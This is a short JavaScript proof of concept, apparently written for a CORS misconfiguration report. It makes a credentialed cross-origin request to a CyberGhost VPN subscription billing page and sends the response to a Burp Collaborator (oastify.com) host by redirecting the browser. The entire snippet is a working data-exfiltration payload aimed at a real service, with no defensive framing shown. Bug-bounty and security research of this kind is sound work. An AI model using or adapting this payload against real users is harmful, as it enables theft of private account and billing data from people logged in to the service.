var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://my.cyberghostvpn.com/subscriptions/13265986/bills',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://rd0ekamx9r0hb83f9hilnmqxvcmid63us.oastify.com/log?key='+this.responseText;
};
